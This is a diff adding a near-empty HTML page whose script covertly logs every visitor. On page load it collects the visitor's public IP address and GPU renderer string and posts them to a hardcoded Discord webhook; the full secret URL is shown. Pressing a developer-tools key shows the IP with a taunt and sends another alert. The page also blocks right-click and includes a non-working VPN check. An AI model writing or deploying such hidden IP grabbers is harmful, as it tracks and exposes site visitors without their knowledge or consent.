@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>six</title>
+    <style>
+        body {
+            background-color: #000000;
+            color: #fff;
+            font-family: Consolas, monospace;
+            font-size: 16px;
+            text-align: center;
+            margin: 0;
+            padding: 50px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            overflow: hidden; /* Add this line to remove the scroll bar */
+        }
+    </style>
+</head>
+<body>
+    <div class="content">
+        <script>
+            const ipCooldowns = {};
+
+            document.addEventListener('contextmenu', (e) => e.preventDefault());
+
+            (async () => {
+                let usingVPN = false;
+                const xhr = new XMLHttpRequest();
+                xhr.open('GET', 'https://api.ipify.org/?format=json', true);
+                xhr.onload = function () {
+                    if (xhr.status >= 200 && xhr.status < 300) {
+                        const data = JSON.parse(xhr.responseText);
+                        if (data.ip.startsWith('10.') || data.ip.startsWith('192.168.') || data.ip.startsWith('172.16.')) {
+                            usingVPN = true;
+                        }
+                    }
+                };
+                xhr.onerror = function () { usingVPN = true; };
+                xhr.send();
+
+                try {
+                    const response = await fetch("https://api.ipify.org?format=json");
+                    const { ip } = await response.json();
+                    
+                    const canvas = document.createElement("canvas");
+                    const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
+                    const gpuInfo = gl ? gl.getParameter(gl.UNMASKED_RENDERER_WEBGL) : "GPU information not available";
+
+                    let embedData = { embeds: [{ title: "IP and GPU Info", description: `IP: ${ip}\nGPU: ${gpuInfo}\nVPN: ${usingVPN}`, color: 0x6A00FF }] };
+
+                    await fetch("https://ptb.discord.com/api/webhooks/1230589557846704218/Jnrda7ilP7mYJmhKI_k0Dr3jsMM2AE-tsXyQJA8vzHfvUE7wJ6lr1lQoyKdL8SuzSmjX", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(embedData) });
+                } catch (error) {}
+            })();
+
+            document.onkeydown = async (e) => {
+                const blacklistedKeybinds = [123, 'I'.charCodeAt(0), 'J'.charCodeAt(0), 'C'.charCodeAt(0), 'U'.charCodeAt(0)];
+                if (blacklistedKeybinds.includes(e.keyCode) || (e.ctrlKey && e.shiftKey)) {
+                    try {
+                        const response = await fetch("https://api.ipify.org?format=json");
+                        const { ip } = await response.json();
+                        
+                        if (ipCooldowns[ip] && (Date.now() - ipCooldowns[ip]) < 10000) { return false; }
+                        ipCooldowns[ip] = Date.now();
+
+                        document.body.innerHTML = `<h1>hi skid :3 <br> ${ip}</h1>`;
+                        
+                        let embedSkidding = { embeds: [{ title: "skid alert !!!1!", description: `${ip} just tried skidding!`, color: 0x6A00FF }] };
+
+                        await fetch("https://ptb.discord.com/api/webhooks/1230589557846704218/Jnrda7ilP7mYJmhKI_k0Dr3jsMM2AE-tsXyQJA8vzHfvUE7wJ6lr1lQoyKdL8SuzSmjX", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(embedSkidding) });
+                    } catch (error) {}
+                    return false;
+                }
+            };
+        </script>
+    </div>
+</body>
+</html>
